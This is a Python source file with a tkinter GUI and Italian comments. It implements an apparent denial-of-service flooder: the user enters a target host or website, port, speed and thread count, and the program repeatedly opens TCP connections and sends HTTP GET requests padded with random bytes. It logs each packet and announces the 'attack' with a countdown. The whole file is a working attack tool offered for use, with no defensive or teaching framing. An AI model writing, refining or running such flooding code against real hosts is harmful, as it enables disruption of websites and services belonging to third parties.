# --

import tkinter as tk
import threading
import socket
import time
import random
import os
import datetime
from colorama import Fore, Style, init #non utilizzata
from threading import Thread

# --

init() #non utilizzata (colorama)

cartella_log = "logs"
data_ora_corrente = datetime.datetime.now()
nome_file = data_ora_corrente.strftime("%Y-%m-%d_%H-%M-%S.txt")


def log(message):

    os.makedirs(cartella_log, exist_ok=True)

    try:
            
        percorso_file = os.path.join(cartella_log, nome_file)
        file_log = open(percorso_file, "a")
        file_log.write(message + "\n")
        file_log.close()

    except Exception as error:
        print(f"{error}")

# --

class ConsoleApp:
    def __init__(self, root):
        self.root = root
        root.title("Console App")
        root.configure(bg="#282828")
        root.geometry("800x800")

        font_size = ("Arial", 12)  

        self.host_label = tk.Label(root, text="Host: (ip address Ex: 123.123.123 Or WebSite example.com)", bg="#282828", fg="white", font=font_size)
        self.host_label.grid(row=0, column=0, padx=5, pady=5, sticky="w")
        self.host_entry = tk.Entry(root, bg="#383838", fg="white", font=font_size)
        self.host_entry.grid(row=0, column=1, padx=5, pady=5)

        self.port_label = tk.Label(root, text="Port: (default 80)", bg="#282828", fg="white", font=font_size)
        self.port_label.grid(row=1, column=0, padx=5, pady=5, sticky="w")
        self.port_entry = tk.Entry(root, bg="#383838", fg="white", font=font_size)
        self.port_entry.grid(row=1, column=1, padx=5, pady=5)

        self.speed_label = tk.Label(root, text="Speed Per Run: (default 1)", bg="#282828", fg="white", font=font_size)
        self.speed_label.grid(row=2, column=0, padx=5, pady=5, sticky="w")
        self.speed_entry = tk.Entry(root, bg="#383838", fg="white", font=font_size)
        self.speed_entry.grid(row=2, column=1, padx=5, pady=5)

        self.threads_label = tk.Label(root, text="Thread Count: (default 1)", bg="#282828", fg="white", font=font_size)
        self.threads_label.grid(row=3, column=0, padx=5, pady=5, sticky="w")
        self.threads_entry = tk.Entry(root, bg="#383838", fg="white", font=font_size)
        self.threads_entry.grid(row=3, column=1, padx=5, pady=5)

        self.start_button = tk.Button(root, text="Start", command=self.start_operation, bg="#555555", fg="white", font=font_size)
        self.start_button.grid(row=4, columnspan=2, padx=5, pady=10)

        self.console_text = tk.Text(root, bg="#383838", fg="white", height=20, width=80, font=font_size)
        self.console_text.grid(row=5, columnspan=2, padx=5, pady=5)
        self.console_text.config(state=tk.DISABLED)

        self.reset_button = tk.Button(root, text="Reset", command=self.reset_ui, bg="#880000", fg="white", font=font_size)
        self.reset_button.grid(row=6, columnspan=2, padx=5, pady=10)

        self.host = ""
        self.port = 0
        self.speed_per_run = 0
        self.threads = 0

    def start_operation(self):
        self.host = self.host_entry.get()
        try:
            self.port = int(self.port_entry.get())
        except ValueError:
            self.print_to_console("ERROR Port must be a number, Set Port to default 80")
            self.port = 80
        try:
            self.speed_per_run = int(self.speed_entry.get())
        except ValueError:
            self.print_to_console("ERROR SpeedPerRun must be a number, Set SpeedPerRun to default 1")
            self.speed_per_run = 1
        try:
            self.threads = int(self.threads_entry.get())
        except ValueError:
            self.print_to_console("ERROR Threads must be a number, Set Threads to default 1")
            self.threads = 1

        self.host_entry.config(state=tk.DISABLED)
        self.port_entry.config(state=tk.DISABLED)
        self.speed_entry.config(state=tk.DISABLED)
        self.threads_entry.config(state=tk.DISABLED)
        self.start_button.config(state=tk.DISABLED)

        threading.Thread(target=self.run_operation).start()

    def run_operation(self):

        bytesToSend = random._urandom(2450)
        i = 0;

        class Count:
            packetCounter = 0 

        self.print_to_console("Attack starting in 5 seconds [----                      10%]")
        time.sleep(1)
        self.print_to_console("Attack starting in 4 seconds [--------                  35%]")
        time.sleep(1)
        self.print_to_console("Attack starting in 3 seconds [------------              45%]")
        time.sleep(1)
        self.print_to_console("Attack starting in 2 seconds [----------------          62%]")
        time.sleep(1)
        self.print_to_console("Attack starting in 1 seconds [--------------------      79%]")
        time.sleep(1)
        self.print_to_console("Attack starting in 0 seconds [------------------------ 100%]")
        time.sleep(1) 
        self.print_to_console("Starting the attack...")    

        try:

            while True:

                dosSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

                try:

                    dosSocket.connect((self.host, self.port))

                    for i in range(self.speed_per_run):

                        dosSocket.send(str.encode("GET ") + bytesToSend + str.encode(" HTTP/1.1 \r\n"))
                        dosSocket.sendto(str.encode("GET ") + bytesToSend + str.encode(" HTTP/1.1 \r\n"), (self.host, self.port))
                        messagea = str(f"-----< Packet {Count.packetCounter} Succesfully sent at: {self.host} Port: {self.port} Thread Count: {self.threads} Hits Per Run: {self.speed_per_run} >-----")
                        Count.packetCounter = Count.packetCounter + 1
                        self.print_to_console(messagea)
                        log(message=messagea)
                        break

                except Exception as error:

                    self.print_to_console(f"{error}")
                    break

        except Exception as error:
            self.print_to_console(f"{error}")

        self.host_entry.config(state=tk.NORMAL)
        self.port_entry.config(state=tk.NORMAL)
        self.speed_entry.config(state=tk.NORMAL)
        self.threads_entry.config(state=tk.NORMAL)
        self.start_button.config(state=tk.NORMAL)

    def print_to_console(self, message):
        self.console_text.config(state=tk.NORMAL)
        self.console_text.insert(tk.END, message + "\n")
        self.console_text.config(state=tk.DISABLED)
        self.console_text.see(tk.END)

    def reset_ui(self):
        self.host_entry.config(state=tk.NORMAL)
        self.port_entry.config(state=tk.NORMAL)
        self.speed_entry.config(state=tk.NORMAL)
        self.threads_entry.config(state=tk.NORMAL)
        self.start_button.config(state=tk.NORMAL)
        self.host_entry.delete(0, tk.END)
        self.port_entry.delete(0, tk.END)
        self.speed_entry.delete(0, tk.END)
        self.threads_entry.delete(0, tk.END)
        self.console_text.config(state=tk.NORMAL)
        self.console_text.delete("1.0", tk.END)
        self.console_text.config(state=tk.DISABLED)
        self.host = ""
        self.port = 0
        self.speed_per_run = 0
        self.threads = 0

if __name__ == "__main__":
    root = tk.Tk()
    app = ConsoleApp(root)
    root.mainloop()

# --